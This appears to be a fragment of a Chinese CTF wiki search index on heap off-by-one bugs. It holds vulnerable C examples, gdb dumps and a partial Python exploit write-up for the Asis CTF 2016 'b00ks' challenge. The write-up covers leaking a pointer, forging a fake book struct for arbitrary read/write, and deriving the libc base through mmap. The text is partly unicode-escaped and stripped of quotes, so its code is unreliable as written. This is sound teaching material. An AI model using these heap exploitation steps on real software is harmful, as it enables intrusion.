\u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002\n\u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684CPU\u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2aDWORD\u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684\n\n\nDWORD 0x41424344\n\u5185\u5b58  0x44,0x43,0x42,0x41\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u5bfb\u627e off-by-one \u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:\n\n\n\u6ce8\u610f\u5faa\u73af\u8fb9\u754c\n\n\n\u5728\u8fdb\u884c\u8bf8\u5982\u5faa\u73af\u5199\u5165\u7684\u64cd\u4f5c\u65f6\uff0c\u8981\u7279\u522b\u6ce8\u610f\u5faa\u73af\u7684\u6b21\u6570\u662f\u5426\u5b58\u5728\u8fb9\u754c\u95ee\u9898\u5bfc\u81f4\u7684 off-by-one\u3002\n\n\n\u6ce8\u610f\u5b57\u7b26\u4e32\u64cd\u4f5c\n\n\n\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u5904\u7406\u7684\u4e0d\u4e25\u8c28\u5f80\u5f80\u4f1a\u5bfc\u81f4 off-by-one \u95ee\u9898\u3002\n\n\n\u4f8b\u5b50\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2015_plaidctf_datastore git:\n(\nmaster\n)\n file datastore \ndatastore: ELF \n64\n-bit LSB shared object, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n1a031710225e93b0b5985477c73653846c352add, stripped\n\u279c  2015_plaidctf_datastore git:\n(\nmaster\n)\n checksec datastore \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore\n\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\u279c  2015_plaidctf_datastore git:\n(\nmaster\n)\n \n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u3002\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\u3002\u3002\n\n\n\u529f\u80fd\u5206\u6790\n\n\n\u5f85\u5b8c\u6210\u3002\n\n\n\u9898\u76ee\n\n\nb00ks\n\n\n\u4ecb\u7ecd\n\n\nAsis CTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\u662fnull byte off-by-one\n\n\n\u9898\u76ee\u4ecb\u7ecd\n\n\n\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002\n\n\n1. Create a book\n2. Delete a book\n3. Edit a book\n4. Print book detail\n5. Change current author name\n6. Exit\n\n\n\n\n\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002\u9898\u76ee\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002\n\n\nCanary                        : No\nNX                            : Yes\nPIE                           : Yes\nFortify                       : No\nRelRO                         : Full\n\n\n\n\n\u7a0b\u5e8f\u6bcf\u521b\u5efa\u4e00\u4e2abook\u4f1a\u5206\u914d0x20\u5b57\u8282\u7684\u7ed3\u6784\u6765\u7ef4\u62a4\u5b83\u7684\u4fe1\u606f\n\n\nstruct book\n{\n    int id;\n    char *name;\n    char *description;\n    int size;\n}\n\n\n\n\ncreate\n\n\nbook\u7ed3\u6784\u4e2d\u5b58\u5728name\u548cdescription\uff0cname\u548cdescription\u5728\u5806\u4e0a\u5206\u914d\u3002\u9996\u5148\u5206\u914dname buffer\uff0c\u4f7f\u7528malloc\uff0c\u5927\u5c0f\u81ea\u5b9a\u4f46\u5c0f\u4e8e32\u3002\n\n\nprintf(\n\\nEnter book name size: \n, *(_QWORD *)\nsize);\n__isoc99_scanf(\n%d\n, \nsize);\nprintf(\nEnter book name (Max 32 chars): \n, \nsize);\nptr = malloc(size);\n\n\n\n\n\u4e4b\u540e\u5206\u914ddescription\uff0c\u540c\u6837\u5927\u5c0f\u81ea\u5b9a\u4f46\u65e0\u9650\u5236\u3002\n\n\nprintf(\n\\nEnter book description size: \n, *(_QWORD *)\nsize);\n        __isoc99_scanf(\n%d\n, \nsize);\n\nv5 = malloc(size);\n\n\n\n\n\u4e4b\u540e\u5206\u914dbook\u7ed3\u6784\u7684\u5185\u5b58\n\n\nbook = malloc(0x20uLL);\nif ( book )\n{\n    *((_DWORD *)book + 6) = size;\n    *((_QWORD *)off_202010 + v2) = book;\n    *((_QWORD *)book + 2) = description;\n    *((_QWORD *)book + 1) = name;\n    *(_DWORD *)book = ++unk_202024;\n    return 0LL;\n}\n\n\n\n\n\u6f0f\u6d1e\n\n\n\u7a0b\u5e8f\u7f16\u5199\u7684read\u51fd\u6570\u5b58\u5728null byte off-by-one\u6f0f\u6d1e\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u4e2aread\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u8fb9\u754c\u7684\u8003\u8651\u662f\u4e0d\u5f53\u7684\u3002\n\n\nsigned __int64 __fastcall my_read(_BYTE *ptr, int number)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n  if ( number \n= 0 )\n    return 0LL;\n  buf = ptr;\n  for ( i = 0; ; ++i )\n  {\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n      return 1LL;\n    if ( *buf == \n\\n\n )\n      break;\n    ++buf;\n    if ( i == number )\n      break;\n  }\n  *buf = 0;\n  return 0LL;\n}\n\n\n\n\n\u5229\u7528\n\n\n1.\u6cc4\u6f0f\n\n\n\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684my_read\u51fd\u6570\u5b58\u5728null byte off-by-one\uff0c\u4e8b\u5b9e\u4e0amy_read\u8bfb\u5165\u7684\u7ed3\u675f\u7b26'\\x00'\u662f\u5199\u5165\u52300x555555756060\u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f530x555555756060\uff5e0x555555756068\u5199\u5165book\u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26'\\x00'\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370author name\u5c31\u53ef\u4ee5\u83b7\u5f97pointer array\u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002\n\n\n0x555555756040: 0x6161616161616161  0x6161616161616161\n0x555555756050: 0x6161616161616161  0x6161616161616161   \n== author name\n0x555555756060: 0x0000555555757480 \n== pointer array    0x0000000000000000\n0x555555756070: 0x0000000000000000  0x0000000000000000\n0x555555756080: 0x0000000000000000  0x0000000000000000\n\n\n\n\n\u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728author name\u4e2d\u9700\u8981\u8f93\u516532\u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efabook1\uff0c\u8fd9\u4e2abook1\u7684\u6307\u9488\u4f1a\u8986\u76d6\n\n\ndef js(str):\n     return io.recvuntil(str)\n\ndef jsn(num):\n     return io.recvn(num)\n\ndef fs(str):\n     io.sendline(str)\n\ndef fsn(str):\n     io.send(str)\n\njs(\nEnter author name:\n) #input author name\nfs(\na\n*32)\n\njs(\n)# create book1\nfs(\n1\n)\njs(\nEnter book name size:\n)\nfs(\n32\n)\njs(\nEnter book name (Max 32 chars):\n)\nfs(\nobject1\n)\njs(\nEnter book description size:\n)\nfs(\n32\n)\njs(\nEnter book description:\n)\nfs(\nobject1\n)\n\njs(\n)# print book1\nfs(\n4\n)\njs(\nAuthor:\n)\njs(\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n) # \n== leak book1\nbook1_addr=jsn(6)\nbook1_addr=book1_addr.ljust(8,\n\\x00\n)\nbook1_addr=u64(book1_addr)\n\n\n\n\n2.off-by-one\u8986\u76d6\u6307\u9488\u4f4e\u5b57\u8282\n\n\n\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cdchange\u529f\u80fd\uff0cchange\u529f\u80fd\u7528\u4e8e\u4fee\u6539author name\uff0c\u6240\u4ee5\u901a\u8fc7change\u53ef\u4ee5\u5199\u5165author name\uff0c\u5229\u7528off-by-one\u8986\u76d6pointer array\u7b2c\u4e00\u4e2a\u9879\u7684\u4f4e\u5b57\u8282\u3002\n\n\n\u8986\u76d6\u6389book1\u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411book1\u7684description\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86edit\u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539description\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728description\u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2abook\u7ed3\u6784\uff0c\u8fd9\u4e2abook\u7ed3\u6784\u7684description\u548cname\u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002\n\n\ndef off_by_one(addr):\n    addr+=58\n    js(\n)# create fake book in description\n    fs(\n3\n)\n    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) \n    js(\nEnter new book description:\n)\n    fs(fake_book_data)      # \n== fake book\n\n\n    js(\n)# change author name\n    fs(\n5\n)\n    js(\nEnter author name:\n)\n    fs(\na\n*32)          # \n== off-by-one\n\n\n\n\n\u8fd9\u91cc\u5728description\u4e2d\u4f2a\u9020\u4e86book\uff0c\u4f7f\u7528\u7684\u6570\u636e\u662fp64(0x1)+p64(addr)+p64(addr)+pack(0xffff)\u3002\n\u5176\u4e2daddr+58\u662f\u4e3a\u4e86\u4f7f\u6307\u9488\u6307\u5411book2\u7684\u6307\u9488\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u8fd9\u4e9b\u6307\u9488\u503c\u3002\n\n\n3.\u901a\u8fc7\u6808\u5b9e\u73b0\u5229\u7528\n\n\n\u901a\u8fc7\u524d\u97622\u90e8\u5206\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u8bfb\u8005\u8bfb\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u89c9\u5f97\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199got\u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199__malloc_hook\u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542fPIE\u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0flibc\u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002\n\n\n\u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2abook\u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5mmap\u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662fbrk\u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662fmmap\u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002\n\n\n\u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528mmap\u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3ammap\u5206\u914d\u7684\u5185\u5b58\u4e0elibc\u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51falibc\u7684\u57fa\u5730\u5740\u3002\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- \n0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw- \n=== mmap\n0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- \n0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]\n0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]\n0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\n\n\n\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- \n0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw- \n=== mmap\n0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- \n0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]\n0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]\n0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]", 
            "title": "\u5806\u4e2d\u7684 Off-By-One"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#off-by-one", 
            "text": "", 
            "title": "\u5806\u4e2d\u7684 Off-By-One"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_1", 
            "text": "\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#off-by-one_1", 
            "text": "off-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec   \u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef(\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1)\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002  \u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002   \u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8eLinux\u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002\n\u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a(heap based)\u7684off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002", 
            "title": "off-by-one \u6f0f\u6d1e\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#1", 
            "text": "int my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i =size;i++)\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts( Get Input: );\n    my_gets(chunk1,16);\n    return 0;\n}  \u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2aoff-by-one\u6f0f\u6d1e\uff0c\u539f\u56e0\u662ffor\u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef   wikipedia:\n\u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a  \u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f30\u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u96943\u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f  \u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u684810\u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u670910\u4e2a\u95f4\u9694\uff0c11\u6761\u6805\u680f\u67f1\u3002   \u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5806\u5757 0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021  === chunk2\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df\nprint 'A'*17 0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x0000000000000041  0x0000000000000021  === chunk2 \n0x602030:   0x0000000000000000  0x0000000000000000", 
            "title": "\u793a\u4f8b1"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#2", 
            "text": "\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef  int main(void)\n{\n    char buffer[40]= ;\n    void *chunk1;\n    chunk1=malloc(24);\n    puts( Get Input );\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n\n}  \u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898(\u4e0d\u8003\u8651\u6808\u6ea2\u51fa)\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002\n\u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86off-by-one \u7684\u53d1\u751f\u3002\nstrlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26  '\\x00'  \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26  '\\x00'  \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411chunk1\u4e2d\u5199\u5165\u4e8625\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002  0x602000:   0x0000000000000000  0x0000000000000021  === chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000411  === next chunk  \u5728\u6211\u4eec\u8f93\u5165'A'*24\u540e\u6267\u884cstrcpy  0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x0000000000000400  \u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26  '\\x00'  \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one\uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002\n\u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684CPU\u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2aDWORD\u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684  DWORD 0x41424344\n\u5185\u5b58  0x44,0x43,0x42,0x41", 
            "title": "\u793a\u4f8b2"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_2", 
            "text": "\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u5bfb\u627e off-by-one \u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_3", 
            "text": "\u5728\u8fdb\u884c\u8bf8\u5982\u5faa\u73af\u5199\u5165\u7684\u64cd\u4f5c\u65f6\uff0c\u8981\u7279\u522b\u6ce8\u610f\u5faa\u73af\u7684\u6b21\u6570\u662f\u5426\u5b58\u5728\u8fb9\u754c\u95ee\u9898\u5bfc\u81f4\u7684 off-by-one\u3002", 
            "title": "\u6ce8\u610f\u5faa\u73af\u8fb9\u754c"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_4", 
            "text": "\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26\u5904\u7406\u7684\u4e0d\u4e25\u8c28\u5f80\u5f80\u4f1a\u5bfc\u81f4 off-by-one \u95ee\u9898\u3002", 
            "title": "\u6ce8\u610f\u5b57\u7b26\u4e32\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_5", 
            "text": "", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_6", 
